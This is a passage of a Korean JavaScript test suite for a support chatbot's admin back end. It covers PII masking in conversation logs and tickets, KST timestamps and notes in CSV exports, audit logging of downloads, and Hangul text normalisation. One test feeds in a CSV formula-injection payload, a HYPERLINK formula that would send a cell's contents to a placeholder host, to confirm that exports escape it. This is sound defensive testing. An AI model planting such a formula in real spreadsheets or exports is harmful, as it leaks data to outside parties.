  assert.ok(noted.ticket.note.length <= TICKET_NOTE_LEN, `메모가 상한을 넘었다(${noted.ticket.note.length}자)`);
  assert.ok(noted.ticket.note.length > TICKET_NOTE_LEN - 20, `표시를 붙이며 지나치게 줄였다(${noted.ticket.note.length}자)`);
  assert.ok(noted.ticket.note.endsWith(CLIP_MARK), '상담원 메모를 줄이고 아무 표시도 남기지 않았다');
  esc.resetTickets();
});

/* ══════════ 디자인 스프린트 — 36차 재감사 (DS 39-1·39-2·39-3) ══════════ */

// 세 모듈을 한 컴파일 묶음으로 가져온다(캐시 키가 같아야 tsc 가 한 번만 돈다).
const PII_GROUP = ['convlog', 'escalation', 'limits', 'pii', 'handoff', ...CONVLOG_DEPS];
const pickPii = (name) => importLib(name, PII_GROUP.filter((n) => n !== name));

/**
 * DS 39-1 — 대화 기록이 고객이 친 말을 **원문 그대로** 보관하던 자리.
 *
 * 이 한 줄(`logTurn`)을 지나면 그 글자는 최근 대화 표·상세 서랍·전역 검색·「답하지 못한 질문」
 * (대시보드 첫 화면)·내려받기 CSV·백업 스냅샷 여섯 곳으로 퍼진다. 같은 문장이 이관 요약에서는
 * 가려지는데(`buildHandoffSummary`) 그 옆 화면에서는 원문이었다(QUALITY_BAR §3).
 */
test('대화 기록은 개인정보를 가린 뒤 저장하고 가린 종류를 남긴다 (DS 39-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const { logTurn, resetLogs, listTurns, unansweredQuestions, importTurns } = await pickPii('convlog');
  const { clip, TURN_TEXT_LEN, CLIP_MARK } = await pickPii('limits');
  resetLogs();

  // 계좌는 **하이픈 없이** 적는다 — 종전 `scrub` 이 놓치던 모양이다(DS 39-3).
  // 12자리로 둔 이유: 13자리 숫자열은 구분자 없는 주민등록번호와 구별되지 않아 rrn 규칙에
  // 먼저 걸린다(규칙 순서 = 우선순위). 여기서는 계좌 규칙이 도는지를 본다.
  const raw = '제 번호 010-1234-5678이고 주민번호는 900101-1234567이에요. hong@example.com 으로도 됩니다. 계좌 110212345678';

  // ① 종전 동작 재현 — 자르기만 지나면 원문이 그대로 남는다(이 재현이 통과해야 검증이 뜻을 가진다).
  const before = clip(raw, TURN_TEXT_LEN);
  assert.ok(before.includes('010-1234-5678'), '종전 식에서 휴대폰 번호가 남지 않는다 — 재현 실패');
  assert.ok(before.includes('900101-1234567'), '종전 식에서 주민등록번호가 남지 않는다 — 재현 실패');
  assert.ok(before.includes('hong@example.com'), '종전 식에서 이메일이 남지 않는다 — 재현 실패');

  // ② 고친 뒤 — 저장된 글에는 원문이 하나도 없다.
  logTurn({ sessionId: 's-39', channel: 'web', tenant: null, message: raw, reply: '확인했습니다. ' + raw, intent: 'fallback', source: 'fallback', escalate: true });
  const [turn] = listTurns(1);
  for (const leak of ['010-1234-5678', '900101-1234567', 'hong@example.com', '110212345678']) {
    assert.equal(turn.message.includes(leak), false, '대화 기록에 ' + leak + ' 가 그대로 남았다');
    assert.equal(turn.reply.includes(leak), false, '답변 기록에 ' + leak + ' 가 그대로 남았다');
  }
  // 운영자가 읽는 자리라 끝 네 자리는 남는다(세기 readable) — 「그 번호가 맞는지」 확인에 쓴다.
  assert.match(turn.message, /010-\*\*\*\*-5678/);
  assert.match(turn.message, /900101-\*{7}/);
  assert.match(turn.message, /ho\*\*\*@example\.com/);

  // ③ **가렸다고 말한다** — 가린 글만 남기면 `***` 를 고객이 쓴 줄 안다(DS 38-x 와 같은 규칙).
  assert.deepEqual(turn.piiKinds, ['rrn', 'phone', 'email', 'account'], '가린 종류가 규칙 순서대로 남지 않았다');

  // ④ 「답하지 못한 질문」 목록도 가려진 글을 쓴다 — 그 글이 새 안내 자료의 원문이 된다(DS 32-2).
  const un = unansweredQuestions(8);
  assert.equal(un.items.length, 1);
  assert.equal(un.items[0].question.includes('010-1234-5678'), false, '대시보드 첫 화면에 고객 번호가 뜬다');

  // ⑤ 개인정보가 없는 말은 **한 글자도 바뀌지 않고** 가렸다는 칸도 생기지 않는다.
  logTurn({ sessionId: 's-39', channel: 'web', tenant: null, message: '환불 되나요?', reply: '네, 됩니다.', intent: 'refund', source: 'kb', escalate: false });
  const [plain] = listTurns(1);
  assert.equal(plain.message, '환불 되나요?');
  assert.equal(plain.reply, '네, 됩니다.');
  assert.equal(plain.piiKinds, undefined, '가린 것이 없는데 가렸다고 말한다');

  // ⑥ 가린 **뒤에** 자른다 — 먼저 자르면 상한 경계에 걸친 번호가 쪼개져 규칙에 걸리지 않는다.
  const edge = '가'.repeat(TURN_TEXT_LEN - 15) + '010-1234-5678 입니다';
  assert.ok(clip(edge, TURN_TEXT_LEN).includes('010-12'), '경계 재현 실패 — 종전 순서에서 숫자가 남지 않는다');
  resetLogs();
  logTurn({ sessionId: 's-39b', channel: 'web', tenant: null, message: edge, reply: '네', intent: 'x', source: 'kb', escalate: false });
  const [edged] = listTurns(1);
  assert.equal(edged.message.includes('010-12'), false, '자른 뒤에 가려서 번호 앞자리가 남았다');
  assert.ok(edged.message.length <= TURN_TEXT_LEN, '가리면서 길이 계약을 깼다');
  assert.ok(edged.message.endsWith(CLIP_MARK), '줄이고 표시를 남기지 않았다');
  assert.deepEqual(edged.piiKinds, ['phone']);

  // ⑦ 복원 경로도 같은 관문을 지난다 — 마스킹 이전에 뜬 스냅샷에는 원문이 들어 있다.
  resetLogs();
  const restored = importTurns({
    version: 1,
    savedAt: new Date().toISOString(),
    seq: 9,
    turns: [{ id: 'T-000009', sessionId: 'old', channel: 'web', tenant: null, message: raw, reply: '네', intent: 'x', source: 'kb', escalate: false, at: new Date().toISOString() }],
  });
  assert.equal(restored.ok, true);
  const [old] = listTurns(1);
  assert.equal(old.message.includes('010-1234-5678'), false, '백업을 되돌리자 가려 둔 번호가 되살아났다');
  assert.deepEqual(old.piiKinds, ['rrn', 'phone', 'email', 'account']);
  resetLogs();
});

/**
 * DS 39-2 — 접수 본문(`ticket.message`)이 원문이고, 바로 아래 칸의 이관 요약은 가려져 있었다.
 *
 * 한 서랍 안에서 같은 문장이 한 번은 가려지고 한 번은 그대로다 — 요약만 `buildHandoffSummary` 를
 * 지났기 때문이다. 접수를 만드는 자리는 엔진·라우트에 걸쳐 일곱 곳이라, 가리는 몫은 그 자리마다
 * 적지 않고 `createTicket` 하나가 진다.
 */
test('접수 본문은 가리고 회신할 연락처는 가리지 않는다 (DS 39-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const esc = await pickPii('escalation');
  const { clip, TICKET_MESSAGE_LEN } = await pickPii('limits');
  esc.resetTickets();

  const raw = '제 번호 010-1234-5678로 연락주세요. 주민번호 900101-1234567';
  // 종전 동작 재현 — 자르기만 지나면 본문에 원문이 남는다.
  assert.ok(clip(raw, TICKET_MESSAGE_LEN).includes('010-1234-5678'), '재현 실패');

  const { ticket } = esc.createTicket({ sessionId: 's-39-esc', tenant: null, reason: 'user_request', message: raw, contact: '010-1234-5678' });
  assert.equal(ticket.message.includes('010-1234-5678'), false, '접수 본문에 고객 번호가 그대로 남았다');
  assert.equal(ticket.message.includes('900101-1234567'), false, '접수 본문에 주민등록번호가 그대로 남았다');
  assert.match(ticket.message, /010-\*\*\*\*-5678/);
  assert.deepEqual(ticket.piiKinds, ['rrn', 'phone']);

  // **연락처 칸은 가리지 않는다** — 상담원이 전화를 걸 대상이고, 가리면 접수가 쓸모를 잃는다.
  // 그 칸은 화면 마스킹(`maskContact`)·완료 시 파기(`contactPurgedAt`)·고객에게 되읽을 때
  // 마스킹(`contactTail`) 세 겹으로 다룬다 — 저장할 때 가리는 칸과 다른 규칙이다.
  assert.equal(ticket.contact, '010-1234-5678', '회신할 연락처를 가려 버려 접수가 쓸모를 잃었다');

  // 개인정보가 없는 본문은 한 글자도 바뀌지 않고 가렸다는 칸도 없다.
  esc.resetTickets();
  const plain = esc.createTicket({ sessionId: 's-39-esc2', tenant: null, reason: 'user_request', message: '사람 바꿔 주세요' }).ticket;
  assert.equal(plain.message, '사람 바꿔 주세요');
  assert.equal(plain.piiKinds, undefined, '가린 것이 없는데 가렸다고 말한다');

  // 복원 경로도 같은 관문을 지난다(마스킹 이전 스냅샷에는 본문 원문이 있다).
  esc.resetTickets();
  const r = esc.importTickets({
    version: 1,
    savedAt: new Date().toISOString(),
    seq: 3,
    tickets: [{ id: 'ESC-0003', sessionId: 'old', reason: 'user_request', reasonCode: 'customer_request', message: raw, status: 'open', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() }],
  });
  assert.equal(r.ok, true);
  const got = esc.getTicket('ESC-0003');
  assert.equal(got.message.includes('010-1234-5678'), false, '백업을 되돌리자 접수 본문의 번호가 되살아났다');
  assert.deepEqual(got.piiKinds, ['rrn', 'phone']);
  esc.resetTickets();
});

/**
 * DS 39-3 — 마스킹이 **두 벌**이고, 울타리를 넘는 쪽이 더 느슨했다.
 *
 * `handoff.maskPii`(요약·수집 정보)와 `monitoring.scrub`(서버 로그·오류 리포트·외부 LLM 호출
 * 본문)이 각자 규칙을 들고 있었다. 계좌 규칙이 어긋나 있어서 하이픈 없는 계좌번호는
 * **안에서는 가려지고 밖으로는 그대로 나갔다**.
 */
test('마스킹 규칙은 한 벌이고 울타리를 넘는 쪽이 더 세다 (DS 39-3)', opts, async () => {
  const { maskPii } = await pickPii('pii');
  const { scrub } = await pickPii('monitoring');
  const { buildEntry } = await pickPii('logger');

  // ① 종전 `scrub` 의 계좌 규칙 재현 — 하이픈을 필수로 둬서 하이픈 없는 계좌번호를 놓쳤다.
  const acct = '계좌 110212345678 로 보냈어요';
  assert.equal(/\b\d{2,3}-\d{2,6}-\d{2,6}\b/.test(acct), false, '종전 규칙이 이 번호를 잡는다 — 재현 실패');
  assert.ok(maskPii(acct).hits.includes('account'), '요약 쪽은 가리고 있었어야 한다');
  // 고친 뒤 — 같은 규칙을 쓰므로 밖으로 나가는 쪽도 가린다.
  assert.equal(scrub(acct).includes('110212345678'), false, '외부로 나가는 글에 계좌번호가 그대로 실린다');

  // ② 세기는 받는 쪽에 따라 다르다 — 규칙은 하나, 치환은 둘.
  const pii = '010-1234-5678 / 900101-1234567 / hong@example.com';
  const readable = maskPii(pii, 'readable').text;
  const opaque = maskPii(pii, 'opaque').text;
  assert.deepEqual(maskPii(pii, 'readable').hits, maskPii(pii, 'opaque').hits, '세기가 다르면 집계도 달라졌다');
  // 안: 끝 네 자리를 남겨 상담원이 「그 번호가 맞는지」 확인한다.
  assert.match(readable, /010-\*\*\*\*-5678/);
  assert.match(readable, /900101-\*{7}/);
  assert.match(readable, /ho\*\*\*@example\.com/);
  // 밖: 생년월일(주민번호 앞 6자리)도, 이메일 도메인도 남기지 않는다.
  assert.match(opaque, /01\*-\*\*\*\*-\*\*\*\*/);
  assert.match(opaque, /\*{6}-\*{7}/);
  assert.equal(opaque.includes('900101'), false, '생년월일이 울타리 밖으로 나간다');
  assert.equal(opaque.includes('example.com'), false, '이메일 도메인이 울타리 밖으로 나간다');
  assert.equal(scrub(pii), opaque, '외부 전송 경로가 opaque 를 쓰지 않는다');

  // ③ 예약 일시 보호도 한 벌이 되면서 양쪽에 걸린다 — 방문 날짜가 계좌로 뭉개지면 상담이 막힌다.
  assert.ok(scrub('예약 2026-09-04 14:00').includes('2026-09-04'), '예약 일시를 계좌번호로 읽었다');

  // ④ 규칙을 모으면서 계좌 패턴이 **하이픈 없는 숫자열**까지 보게 됐다 — 우리가 만든 세션 해시가
  //    우연히 전부 숫자이면(16진수 12자라 약 0.3%) 로그에서 그 세션만 추적이 끊긴다.
  const entry = buildEntry('info', 'request', { sessionHash: '123456789012', route: '/api/chat', status: 200 });
  assert.equal(entry.sessionHash, '123456789012', '세션 해시가 마스킹에 걸려 로그 추적이 끊긴다');
  // 대화 본문은 여전히 화이트리스트 밖이다(이름만 남는다).
  const dropped = buildEntry('info', 'request', { message: '010-1234-5678' });
  assert.equal(dropped.message, undefined);
  assert.deepEqual(dropped.dropped, ['message']);
});

/* ══════════ 디자인 스프린트 — 37차 재감사 (DS 40-1·40-2·40-3) ══════════ */

/** CSV 한 줄을 칸으로 가른다(RFC 4180 — 따옴표 안의 쉼표·줄바꿈을 지킨다). */
function csvCells(line) {
  const out = [];
  let cur = '';
  let quoted = false;
  for (let i = 0; i < line.length; i += 1) {
    const c = line[i];
    if (quoted) {
      if (c === '"' && line[i + 1] === '"') {
        cur += '"';
        i += 1;
      } else if (c === '"') quoted = false;
      else cur += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      out.push(cur);
      cur = '';
    } else cur += c;
  }
  out.push(cur);
  return out;
}

/**
 * 머리글 이름으로 칸을 찾아 읽는다 — 열이 늘어도 테스트가 자리 수에 매이지 않게.
 * 꼬리 주석(`# …`)은 쉼표가 들어 있으면 따옴표에 싸이므로 **줄 글자가 아니라 첫 칸**으로 가린다.
 */
function csvTable(csv) {
  const lines = csv.split('\r\n');
  const header = csvCells(lines[0]);
  const rows = [];
  const notes = [];
  for (const line of lines.slice(1)) {
    if (line === '') continue;
    const cells = csvCells(line);
    if (cells[0].startsWith('#')) {
      notes.push(cells[0]);
      continue;
    }
    const row = {};
    header.forEach((h, i) => {
      row[h] = cells[i];
    });
    rows.push(row);
  }
  return { header, rows, notes };
}

/**
 * DS 40-1 — 내려받은 파일의 시각이 **UTC** 로 나가던 자리.
 *
 * 화면은 브라우저 시간대로 그리고 파일 **이름**도 `kstStamp` 로 한국 날짜를 붙이는데, 정작 파일
 * 안의 행만 `at` 원문(ISO·UTC)이었다. 한국 자정~오전 9시의 대화는 엑셀에서 **전날**로 분류되어,
 * 같은 데이터가 화면과 파일에서 다른 날에 속했다(대시보드 「오늘 대화」는 `kstDate` 로 센다).
 */
test('내려받은 파일의 시각은 한국 시간이고, 원문도 함께 남는다 (DS 40-1)', opts, async () => {
  const { kstDateTime, kstDate } = await importLib('kst');
  const conv = await importLib('convlog', CONVLOG_DEPS);
  const audit = await importLib('audit');

  // ① 한국 자정을 넘긴 시각 — ISO 의 날짜와 한국 날짜가 **다른 날**이다(그래서 재현된다).
  const crossing = '2026-10-16T15:30:00.000Z';
  assert.equal(crossing.slice(0, 10), '2026-10-16', '재현 전제: ISO 원문의 날짜');
  assert.equal(kstDate(new Date(crossing)), '2026-10-17', '재현 전제: 한국 날짜는 다음 날이다');
  assert.equal(kstDateTime(crossing), '2026-10-17 00:30:00');
  // 오전 9시 전 — 반대 방향(ISO 는 같은 날인데 한국은 그날 오전)도 어긋나지 않는다.
  assert.equal(kstDateTime('2026-10-16T00:30:00.000Z'), '2026-10-16 09:30:00');
  // 읽을 수 없는 값에는 **지금 시각을 지어내지 않는다**.
  assert.equal(kstDateTime(''), '');
  assert.equal(kstDateTime('어제'), '');

  // ② 대화 기록 CSV — 「시각」은 한국 시간, 「시각(ISO)」는 원문 그대로.
  conv.resetLogs();
  try {
    conv.importTurns({
      version: 1,
      savedAt: crossing,
      seq: 1,
      turns: [{
        id: 'T-000001', sessionId: 's1', channel: 'web', tenant: null,
        message: '영업시간 알려주세요', reply: '평일 9시부터입니다',
        intent: 'hours', source: 'kb', escalate: false, at: crossing,
      }],
    });
    const t = csvTable(conv.turnsToCsv());
    assert.equal(t.rows.length, 1, `행이 하나여야 한다: ${JSON.stringify(t.rows)}`);
    assert.equal(t.rows[0]['시각'], '2026-10-17 00:30:00', '대화 기록 CSV 의 시각이 한국 시간이 아니다');
    assert.equal(t.rows[0]['시각(ISO)'], crossing, '기계가 보는 원문 열이 사라졌다');
    assert.ok(t.notes.some((n) => n.includes('한국 시간')), '파일이 제 시각 기준을 말하지 않는다');
  } finally {
    conv.resetLogs();
  }

  // ③ 변경 이력 CSV — 같은 규칙이 걸린다(두 파일이 다른 시간대로 말하면 대조할 수 없다).
  audit.resetAudit();
  try {
    audit.logAudit({ action: 'kb.upsert', target: 'KB-1', detail: '등록', authed: true });
    const t = csvTable(audit.auditToCsv());
    const row = t.rows[0];
    assert.match(row['시각'], /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/, '변경 이력 CSV 의 시각이 ISO 원문이다');
    assert.equal(row['시각'].includes('T'), false, 'ISO 원문이 사람이 읽는 칸에 남았다');
    assert.match(row['시각(ISO)'], /^\d{4}-\d{2}-\d{2}T.*Z$/, '원문 열이 없다');
    assert.equal(row['시각'], kstDateTime(row['시각(ISO)']), '두 열이 같은 시각을 가리키지 않는다');
    assert.ok(t.notes.some((n) => n.includes('한국 시간')), '변경 이력 파일이 시각 기준을 말하지 않는다');
  } finally {
    audit.resetAudit();
  }
});

/**
 * DS 40-2 — 내려받은 파일이 **「가렸다」는 사실**과 **담긴 범위**를 말하지 않던 자리.
 *
 * 본문은 저장될 때 가려지는데(DS 39-1) 운영 화면은 그 사실을 말하고(서랍 머리의 「개인정보
 * 가림 · 휴대폰 번호」) 파일에는 그 칸이 없었다 — 받는 사람은 `***-****-5678` 을 보고
 * **고객이 그렇게 쓴 줄** 안다. 보관 범위도 화면만 말하고 파일은 말하지 않았다.
 */
test('내려받은 대화 기록이 가린 것과 담긴 범위를 말한다 (DS 40-2)', opts, async () => {
  const conv = await importLib('convlog', CONVLOG_DEPS);
  conv.resetLogs();
  try {
    conv.logTurn({
      sessionId: 's-pii', channel: 'web', tenant: null,
      message: '제 번호 010-1234-5678이고 주민번호는 900101-1234567이에요',
      reply: '확인했습니다', intent: 'contact_captured', source: 'rule', escalate: false,
    });
    conv.logTurn({
      sessionId: 's-clean', channel: 'web', tenant: null,
      message: '영업시간 알려주세요', reply: '평일 9시부터입니다',
      intent: 'hours', source: 'kb', escalate: false,
    });

    const csv = conv.turnsToCsv();
    const t = csvTable(csv);
    assert.ok(t.header.includes('개인정보 가림'), '파일에 가림 표시 열이 없다');

    // ① 가린 줄은 종류를 **사람 말**로 적는다(코드 `phone`·`rrn` 이 아니다).
    const masked = t.rows.find((r) => r['대화'] === 's-pii');
    assert.equal(masked['개인정보 가림'], '주민등록번호, 휴대폰 번호', `가린 종류가 어긋난다: ${masked['개인정보 가림']}`);
    assert.equal(/[A-Za-z]/.test(masked['개인정보 가림']), false, '가린 종류에 영문 코드가 섞였다');
    // ② 원문은 파일에도 없다(저장 경계에서 이미 가려졌다 — 이 열은 그 사실을 말할 뿐이다).
    assert.equal(csv.includes('010-1234-5678'), false, '내려받기 파일에 번호 원문이 남았다');
    assert.equal(csv.includes('900101-1234567'), false, '내려받기 파일에 주민번호 원문이 남았다');
    assert.ok(masked['고객 메시지'].includes('010-****-5678'), '가린 글이 실리지 않았다');

    // ③ 가린 것이 없는 줄은 **빈 칸**이다 — 짧은 말에 붙는 표시도 거짓이다.
    const clean = t.rows.find((r) => r['대화'] === 's-clean');
    assert.equal(clean['개인정보 가림'], '', `가린 것이 없는데 뭔가 적었다: ${clean['개인정보 가림']}`);

    // ④ 파일이 제 내용을 말한다 — 담긴 건수·보관 한도·가림·줄임 표시.
    const notes = t.notes.join('\n');
    assert.ok(notes.includes(`대화 ${t.rows.length}건`), `담긴 건수를 말하지 않는다:\n${notes}`);
    assert.ok(notes.includes(`보관 한도 ${conv.TURN_RETENTION}건`), '보관 한도를 말하지 않는다');
    assert.ok(notes.includes('개인정보를 가린 글'), '가렸다는 사실을 말하지 않는다');
    assert.ok(notes.includes('이하 생략'), '줄인 글의 표시를 설명하지 않는다');
    // 「언제부터의 기록인가」도 말한다 (DS 43-1) — 날짜로 거르는 사람에게 「0건」과 「기록 없음」은 다른 사실이다.
    assert.ok(notes.includes('이후의 기록만 담겨 있습니다'), '언제부터의 기록인지 말하지 않는다');
    assert.ok(notes.includes('「대화 0건」이 아니라 「기록 없음」'), '빈 날을 0건으로 읽게 둔다');
    // 주석은 표와 빈 줄로 떨어져 있고 모두 `#` 로 시작한다(정산 CSV 와 같은 모양).
    assert.ok(csv.includes('\r\n\r\n'), '주석이 표에 붙어 있다');
    assert.equal(t.notes.length, 5, `주석 수가 다르다: ${t.notes.length}`);
    for (const n of t.notes) assert.ok(n.startsWith('# '), `주석 모양이 다르다: ${n}`);

    // ⑤ 수식 주입은 여전히 막는다(공용 이스케이프를 지난다).
    conv.logTurn({
      sessionId: 's-formula', channel: 'web', tenant: null,
      message: '=HYPERLINK("http://x/?d="&A2,"확인")', reply: '@SUM(A1)',
      intent: 'fallback', source: 'fallback', escalate: false,
    });
    const after = conv.turnsToCsv();
    assert.equal(/(^|,)=HYPERLINK/m.test(after), false, '수식이 그대로 실렸다');
    assert.equal(/(^|,)@SUM/m.test(after), false, '수식이 그대로 실렸다');
    assert.ok(after.includes("'=HYPERLINK"), '원문은 보존되어야 한다');
  } finally {
    conv.resetLogs();
  }
});

/**
 * DS 40-3 — 개인정보가 담긴 내려받기가 **흔적을 남기지 않던** 자리.
 *
 * 정산 리포트(금액·개인정보 없음)만 감사 로그에 남았다. 두 창구가 같은 이유로 쿼리 토큰까지
 * 열어 두고 있었는데(브라우저 다운로드), 상담 내용 보존분 전체를 꺼내 가는 쪽은 비어 있었다.
 * 함께: 복원이 받아들이는 작업 코드 목록이 **두 벌**이어서, 새 작업 종류가 조용히 버려졌다.
 */
test('내려받기도 변경 이력에 남고, 작업 코드 목록은 한 벌이다 (DS 40-3)', opts, async () => {
  const audit = await importLib('audit');
  audit.resetAudit();
  try {
    // ① 새 작업 종류에 사람 말 이름이 있다(코드가 표·필터에 그대로 남지 않는다).
    assert.equal(audit.auditActionLabel('conversation.export'), '대화 기록 내려받기');
    assert.equal(audit.auditActionLabel('backup.export'), '백업 내려받기');

    // ② **복원이 전부 받아들인다** — 종전에는 받아들이는 목록이 손으로 적은 사본이어서,
    //    사전에만 추가된 코드는 백업을 되돌릴 때 조용히 사라졌다(누가 언제 했는지 알 수 없다).
    const codes = Object.keys(audit.AUDIT_ACTION_LABELS);
    assert.ok(codes.includes('conversation.export') && codes.includes('backup.export'));
    const snapshot = {
      version: 1,
      savedAt: new Date().toISOString(),
      seq: codes.length,
      events: codes.map((action, i) => ({
        id: `A-${String(i + 1).padStart(6, '0')}`,
        at: new Date().toISOString(),
        action,
        target: '',
        detail: '복원 대상',
        authed: true,
      })),
    };
    const r = audit.importAudit(snapshot);
    assert.equal(r.ok, true);
    assert.equal(r.count, codes.length, `복원에서 ${codes.length - r.count}종이 조용히 버려졌다`);
    const restored = audit.listAudit(500).map((e) => e.action);
    for (const c of codes) assert.ok(restored.includes(c), `${c} 가 복원에서 사라졌다`);
    // 모르는 코드는 여전히 들이지 않는다(옛 스냅샷의 쓰레기 값을 표에 세우지 않는다).
    assert.equal(audit.importAudit({ ...snapshot, events: [{ ...snapshot.events[0], action: 'someone.new' }] }).count, 0);

    // ③ 내려받기 기록에는 **건수만** 남고 대화 본문·연락처는 싣지 않는다(§10.3).
    audit.resetAudit();
    audit.logAudit({ action: 'conversation.export', detail: '대화 7건(보관분 전체)', authed: true });
    const csv = audit.auditToCsv();
    assert.ok(csv.includes('대화 기록 내려받기'), '내려받은 사실이 변경 이력에 남지 않는다');
    assert.ok(csv.includes('대화 7건(보관분 전체)'), '무엇을 꺼내 갔는지 남지 않는다');
  } finally {
    audit.resetAudit();
  }
});

/* ══════════ 42순위 — 백로그 소진 후 39차 재감사 (DS 42-1·42-2·42-3) ══════════ */

/** 분해형(NFD) 한글 — macOS 파일·PDF 에서 긁어온 본문이 이 모습으로 들어온다. */
const nfd = (s) => s.normalize('NFD');

/**
 * DS 42-1 — 「같은 말인가」를 묻는 자가 서버 안에서도 두 벌이었다.
 *
 * 고객사 이름 검색(`queryAccounts`)이 `toLowerCase().replace(/\s+/g,'')` 를 따로 적어 두어
 * 문장부호와 분해형 한글을 다른 글자로 봤다 — 「(주)고원」을 「주고원」으로 찾지 못한다.
 * 엔진이 쓰는 자(`compact`)를 그대로 쓰게 했다.
 */
test('이름 검색이 엔진과 같은 자를 쓴다 (DS 42-1)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const P = await importLib('partners', ['storage', 'logger', 'monitoring']);
  const N = await importLib('normalize', []);
  P.resetPartners();
  try {
    const p = P.upsertPartner({ name: '제이투모로우원' });
    assert.equal(p.ok, true, p.error);
    const a = P.upsertAccount({ name: '(주)고원 커머스', partnerId: p.partner.id, source: 'partner' });
    assert.equal(a.ok, true, a.error);

    const names = (q) => P.queryAccounts({ q }).map((x) => x.name);
    // ① 종전 식 재현 — 괄호를 지우지 않으므로 그대로 치면 찾지 못했다.
    const oldNorm = (v) => v.trim().toLowerCase().replace(/\s+/g, '');
    assert.equal(oldNorm('(주)고원 커머스').includes(oldNorm('주고원')), false, '종전 식에서도 찾힌다 — 결함이 재현되지 않는다');
    assert.equal(oldNorm('(주)고원 커머스').includes(oldNorm(nfd('고원커머스'))), false, '종전 식이 분해형도 찾는다 — 재현이 성립하지 않는다');
    // ② 고친 쪽: 문장부호·띄어쓰기·분해형 표기가 달라도 같은 이름이다.
    assert.deepEqual(names('주고원'), ['(주)고원 커머스'], '문장부호를 지운 이름으로 찾지 못한다');
    assert.deepEqual(names('고원커머스'), ['(주)고원 커머스'], '띄어쓰기를 지운 이름으로 찾지 못한다');
    assert.deepEqual(names(nfd('고원 커머스')), ['(주)고원 커머스'], '분해형으로 친 이름을 다른 글자로 본다');
    // ③ 없는 이름을 만들어 내지는 않는다.
    assert.deepEqual(names('존재하지않는회사'), []);
    // ④ 정규화는 멱등하다 — 두 번 지나도 같은 값이어야 어느 자리에서 부르든 결과가 같다.
    for (const s of ['(주)고원 커머스', 'ENVIRONMENT 인증서', nfd('환불 되나요?'), '좋아요오오오']) {
      assert.equal(N.compact(s), N.compact(N.compact(s)), `정규화가 멱등하지 않다: ${s}`);
      assert.equal(N.compact(s), N.compact(nfd(s)), `분해형을 다른 글자로 본다: ${s}`);
    }

    // ⑤ 같은 어긋남이 엔진 안에도 있었다 — 연관 질문(`searchKnowledge`)은 질의를 `compact` 로
    //    재면서 **대표 질문만** 문장부호를 남겨 두어, 가장 가까운 자료가 목록에서 빠졌다.
    const K = await importLib('knowledge', ['normalize']);
    const entries = [{ id: 'k42', category: '일반', question: '환불·교환, 가능한가요?', keywords: ['zzzzq'], answer: '네' }];
    const oldQ = '환불·교환, 가능한가요?'.toLowerCase().replace(/\s+/g, '');
    assert.equal(oldQ.includes('환불교환가능한가요'), false, '종전 식에서도 맞는다 — 재현이 아무것도 지키지 않는다');
    assert.deepEqual(K.searchKnowledge('환불교환가능한가요', 3, entries).map((e) => e.id), ['k42'], '가장 가까운 자료가 연관 질문에서 빠진다');
  } finally {
    P.resetPartners();
  }
});

/**
 * DS 42-2 — 「답하지 못한 질문」 묶음이 **문장부호·유니코드 표기 차이로 쪼개졌다**.
 *
 * 엔진은 `compact` 로 보고 세 질문에 똑같이 답하지 못했는데, 목록은 자기 자를 따로 적어
 * (`trim().toLowerCase().replace(/\s+/g,'')`) 그것을 여러 줄로 세었다. 그 목록은 대시보드
 * 첫 화면의 상위 8개이고 **새 안내 자료의 원문**이라, 쪼개지면 가장 많이 온 질문이 밀려난다.
 */
test('같은 질문은 문장부호·표기가 달라도 한 묶음이다 (DS 42-2)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const { logTurn, resetLogs, unansweredQuestions } = await importLib('convlog', CONVLOG_DEPS);
  resetLogs();
  let seq = 0;
  const turn = (message) => logTurn({
    sessionId: `s42-${(seq += 1)}`, channel: 'web', tenant: null,
    message, reply: '답', intent: 'fallback', source: 'fallback', escalate: false,
  });
  try {
    const variants = ['환불 되나요?', '환불되나요', '환불 되나요!', nfd('환불되나요?')];

    // ① 종전 식 재현 — 네 표기가 **네 묶음**으로 갈라졌다(이것이 결함의 크기다).
    const oldKey = (m) => m.trim().toLowerCase().replace(/\s+/g, '');
    assert.equal(new Set(variants.map(oldKey)).size, 4, '종전 식에서도 묶인다 — 재현이 아무것도 지키지 않는다');

    // ② 고친 쪽 — 한 묶음, 네 번.
    for (const v of variants) turn(v);
    let r = unansweredQuestions();
    assert.equal(r.groups, 1, '같은 질문이 여러 묶음으로 쪼개진다');
    assert.equal(r.items.length, 1);
    assert.equal(r.items[0].count, 4, '묶은 횟수가 받은 횟수와 다르다');
    assert.equal(r.turns, 4);
    // 보여 주는 표기는 **가장 최근에 받은 것** 그대로다(묶었다고 글자를 바꾸지 않는다).
    assert.equal(r.items[0].question, nfd('환불되나요?'));

    // ③ 다른 질문까지 합치지는 않는다.
    turn('주차 되나요?');
    r = unansweredQuestions();
    assert.equal(r.groups, 2, '다른 질문이 한 묶음으로 합쳐졌다');

    // ④ 글자가 모두 지워지는 말(기호뿐인 질문)은 서로 합치지 않는다 — 빈 열쇠 하나로 뭉개면
    //    서로 다른 질문이 한 줄이 되고 운영자는 무엇을 고쳐야 할지 알 수 없다.
    resetLogs();
    turn('???');
    turn('!!!');
    assert.equal(unansweredQuestions().groups, 2, '기호뿐인 질문이 한 묶음으로 뭉개진다');
  } finally {
    resetLogs();
  }
});

/**
 * DS 42-3 — 분해형 한글로 붙여 넣은 문서가 **통째로 버려졌다**.
 *
 * 키워드 토큰 경계(`[^0-9a-z가-힣]+`)의 한글 범위는 **완성형 음절만** 가리킨다. 분해형 본문은
 * 모든 한글이 구분자로 읽혀 토큰이 0개가 되고, 그러면 모든 청크가 걸러져 업로드가
 * 「본문이 너무 짧거나 키워드가 없습니다」로 끝난다 — 수만 자짜리 한글 문서를 올려 놓고 듣는 말이다.
 */
test('분해형 한글로 붙여 넣은 문서도 그대로 후보가 된다 (DS 42-3)', opts, async () => {
  const ingest = await importLib('ingest', ['knowledge', 'normalize']);
  const doc = [
    '# 환불 정책',
    '',
    '주문하신 상품은 수령일로부터 7일 이내에 환불을 신청하실 수 있습니다. 환불 신청은 고객센터로 연락해 주세요.',
    '단순 변심으로 인한 환불은 왕복 배송비가 부과됩니다. 배송비는 주문하신 금액에서 차감됩니다.',
